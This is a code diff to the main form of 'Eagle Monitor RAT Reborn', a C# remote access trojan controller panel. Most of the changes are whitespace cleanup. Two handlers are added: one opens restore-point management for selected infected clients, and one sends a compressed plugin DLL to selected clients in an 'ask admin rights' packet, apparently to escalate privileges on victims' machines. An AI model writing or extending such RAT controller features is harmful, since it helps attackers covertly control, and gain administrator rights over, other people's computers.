@@ -47,7 +47,7 @@ namespace EagleMonitor
             Directory.CreateDirectory("Clients");
             if (File.Exists(Miscellaneous.GPath + "\\config.json"))
             {
-                string json = System.IO.File.ReadAllText(Miscellaneous.GPath + "\\config.json");
+                string json = File.ReadAllText(Miscellaneous.GPath + "\\config.json");
                 Miscellaneous.settings = JsonConvert.DeserializeObject<Settings>(json);
                 foreach (int p in Miscellaneous.settings.ports)
                 {
@@ -96,9 +96,9 @@ namespace EagleMonitor
             performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
         }
 
-
         private void Main_Load(object sender, EventArgs e)
         {
+
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView2, guna2VScrollBar2, true);
             //                this.label1.Text = $"Eagle Monitor RAT Reborn V{AboutForm.CoreAssembly.Version}";
@@ -113,6 +113,7 @@ namespace EagleMonitor
 
         private void Main_Shown(object sender, EventArgs e)
         {
+
             loadSettings = new LoadSettings(Settings);
             performance = new Performance(PerformanceCalculator);
             loadSettings.BeginInvoke(new AsyncCallback(SettingsLoaded), this);
@@ -133,7 +134,7 @@ namespace EagleMonitor
                         foreach (GitHubAPI gitHubAPI in json)
                         {
                             this.updateLogRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
-                            this.updateLogRichTextBox.AppendText("Version : "+ gitHubAPI.tag_name + "\n\n");
+                            this.updateLogRichTextBox.AppendText("Version : " + gitHubAPI.tag_name + "\n\n");
 
                             this.updateLogRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
                             this.updateLogRichTextBox.AppendText(gitHubAPI.body.Replace("*", "•") + "\n\n\n");
@@ -147,6 +148,7 @@ namespace EagleMonitor
                 }
             }));
         }
+
 
         private void dataGridView1_Leave(object sender, EventArgs e)
         {
@@ -184,7 +186,6 @@ namespace EagleMonitor
         {
             dataGridView1.ClearSelection();
         }
-
 
         private void pictureBox2_MouseHover(object sender, EventArgs e)
         {
@@ -792,6 +793,50 @@ namespace EagleMonitor
             }
         }
 
+        private void restorePointtoolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].restorePointForm != null)
+                    {
+                        ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
+                    }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].restorePointForm = new RestorePointForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
+                    }
+
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].restorePointForm = new RestorePointForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].restorePointForm.Text = "Restore Points: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].restorePointForm.label1.Text = "Restore Points: " + ClientHandler.ClientHandlersList[IP].fullName;
+                }
+            }
+        }
+
+        private void getPrivilegeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            AskAdminRightsPacket askAdminRightsPacket = new AskAdminRightsPacket
+            {
+                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
+            };
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                ClientHandler.ClientHandlersList[IP].SendPacket(askAdminRightsPacket);
+            }
+        }
+
         private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
         {
             new AboutForm().Show();
@@ -842,5 +887,6 @@ namespace EagleMonitor
             Process.Start(Application.StartupPath + "\\Eagle Monitor Tasks Configurator.exe").WaitForExit(-1);
             StartupTaskHandler.CheckSettingsAgain();
         }
+
     }
 }
